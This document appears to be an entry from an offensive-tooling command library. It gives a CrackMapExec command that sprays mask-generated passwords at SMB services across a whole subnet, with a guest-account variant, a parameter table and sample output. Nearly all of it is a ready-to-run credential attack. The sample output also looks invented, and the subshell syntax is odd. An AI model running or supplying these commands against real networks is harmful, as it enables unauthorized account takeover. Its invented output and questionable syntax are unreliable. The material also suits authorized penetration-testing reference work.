---
id: be926e64-c1dc-4b0a-8502-35d1fb608bff
name: crackmapexec-smb-spray-with-password-mask
type: command
executor: bash
data: crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
output: null
created_at: '2023-04-06T03:56:04.297589+00:00'
updated_at: '2023-04-10T20:25:55.315382+00:00'
platforms:
  - Linux
tags:
  - password-spraying
  - smb
verified: true
validated: true
---

# crackmapexec-smb-spray-with-password-mask

## Command

```bash
crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
```

## Description

This command uses CrackMapExec to perform password spraying against SMB services in an IP range, generating passwords on-the-fly from a mask using mp64.bin. It's useful for testing common password patterns without a full wordlist.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| smb | Protocol to target (SMB) | Yes |
| 10.0.0.1/24 | Target IP range | Yes |
| -u Administrator | Username to spray | Yes |
| -p `(./mp64.bin Pass@wor?l?a)` | Password mask for generation (executes mp64.bin) | Yes |

## Examples

### Basic Usage

```bash
crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
```

### Advanced Usage

```bash
crackmapexec smb 192.168.1.0/24 -u guest -p `(./mp64.bin Season2023?d?l)` --no-bruteforce
```

## Expected Output

SMB         10.0.0.5:445      Administrator:Pass@wor1a         status: 0       [GREEN]
SMB         10.0.0.6:445      Administrator:Pass@wor2a         status: 1       [RED]

Success shown in green for valid logins.

## Related

- [[procedures/Password-Spraying-with-Pre-Generated-Passwords]]
- [[tools/CrackMapExec]]
